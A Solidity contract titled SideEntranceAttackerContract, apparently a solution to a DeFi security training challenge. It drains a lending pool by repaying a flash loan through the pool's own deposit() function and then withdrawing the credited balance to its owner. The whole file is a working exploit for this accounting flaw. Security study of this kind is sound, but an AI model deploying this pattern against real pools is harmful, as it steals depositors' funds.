// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title SideEntranceAttackerContract
 */
contract SideEntranceAttackerContract {
    using Address for address;
    using Address for address payable;

    address private pool;
    uint256 private amount;
    address private owner;

    constructor(address poolAddress) {
        pool = poolAddress;
        owner = msg.sender;
    }

    function execute() external payable {
        //abi
        pool.functionCallWithValue(
            abi.encodeWithSignature("deposit()", amount),
            amount
        );
    }

    function attack(uint256 _amount) external {
        amount = _amount;

        pool.functionCall(
            abi.encodeWithSignature("flashLoan(uint256)", _amount)
        );
        pool.functionCall(abi.encodeWithSignature("withdraw()"));
        payable(owner).sendValue(address(this).balance);
    }

    receive() external payable {}
}
